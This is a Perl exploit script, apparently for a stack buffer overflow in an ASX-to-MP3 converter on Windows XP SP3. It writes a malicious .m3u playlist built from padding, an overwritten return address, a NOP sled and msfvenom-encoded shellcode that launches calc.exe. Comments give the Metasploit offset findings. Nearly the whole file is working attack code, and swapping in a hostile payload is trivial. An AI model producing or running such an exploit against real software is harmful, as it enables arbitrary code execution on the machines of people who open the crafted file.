#!/usr/bin/perl

# Tested on WinXP SP3

#ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x387A5337 -l 50000
#[*] Exact match at offset 14813
# Confirmed 35093 is the correct
# EIP @ 0x000FFD34
#[*] Exact match at offset 35093

# ESP ~ 14869B available

###################################################################################################


# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\xff\x0a\x0d' -i 3 -f ruby'
my $buf =
"\xd9\xca\xd9\x74\x24\xf4\x5b\xbe\xfc\xcb\x71\x47\x29\xc9" .
"\xb1\x3e\x31\x73\x1a\x83\xeb\xfc\x03\x73\x16\xe2\x09\x73" .
"\xf6\xd2\x7b\x14\x20\x13\xa2\x61\xf7\x58\x0b\xa3\x3e\x11" .
"\x8b\x30\x07\x56\xda\x71\x86\x54\xdc\xe5\xfe\x3f\xad\x02" .
"\xa8\x64\xcb\xb2\x38\xa1\x3f\xaf\x5f\x30\x98\x45\x8d\x9c" .
"\xe0\x38\x34\x28\x44\x5b\x13\x1d\x0b\x27\xe7\xd5\xc3\x3c" .
"\x60\x27\x82\x66\x9d\xe6\xe7\x83\xd9\xa0\x0c\xdf\x6b\xf3" .
"\xe5\xd7\x8d\x17\xf9\x11\xbf\x6b\x77\x90\x83\x3f\x68\xfc" .
"\x17\x8e\x98\xa8\x7f\xe2\xac\xbb\x3c\xf6\x79\xc5\xa7\xfc" .
"\xf2\x60\x2b\xfc\xdc\xc0\x2c\xb9\xfd\x47\x76\x60\xe7\x76" .
"\xc4\x86\x8f\xb5\x08\x7f\x9e\xe2\xd5\xea\xe7\xf8\x2c\x15" .
"\x8c\xb4\x95\x54\x7c\xaf\xfd\x99\x02\x76\x08\x1f\x74\xeb" .
"\x61\xde\xa9\x10\xa8\xdb\x8e\xa6\x8b\xc1\x9b\xa5\x82\x92" .
"\x95\xc0\x02\x0b\x28\xf4\x14\x5d\xde\x8e\x1f\xae\x49\x35" .
"\xe6\xda\xc2\xa9\x57\x34\xf2\x53\x91\xdd\xfd\xd0\x3c\x08" .
"\x4e\x6a\x6e\x4e\xab\xe7\x26\x6f\x7a\xa2\x1d\xa0\x39\xc0" .
"\xe8\xe2\x40\x6f\xe2\x65\x20\x45\xb3\xa5\x58\x2e\x58\x53" .
"\xb8\x53\x83\x71\x1d\x12\xdc\xba\xf1\x7e\x43\x35\xd6\x1c" .
"\x73\x3f\x83\xce\xa3\x2c\xc4\x50\x91\x20\xc6\xdd\x3a\x68" .
"\x1e\xf1\x68\x0c\x4b\xf9\x6c\xe4";


my $buffSize = 50000;
my $junk = "\x41" x 35093;
my $eip = "\x42" x 4;
#my $eip = pack ('V', 0x77DEF049);
my $eip = pack('V', 0x73E32ECF);
my $nops = "\x90" x 104;
my $sploit = $junk.$eip.$nops.$buf;
my $fill = "\x43" x ($buffSize - (length($sploit)));
my $buffer = $sploit.$fill;

print $buffer

###################################################################################################

my $file = "asx2mp3.m3u";
open (FILE, ">$file");
print FILE $buffer;
close (FILE);
print "Exploit file create [" . $file . " ]\n";
print "Buffer dize: ". length($buffer) . "\n";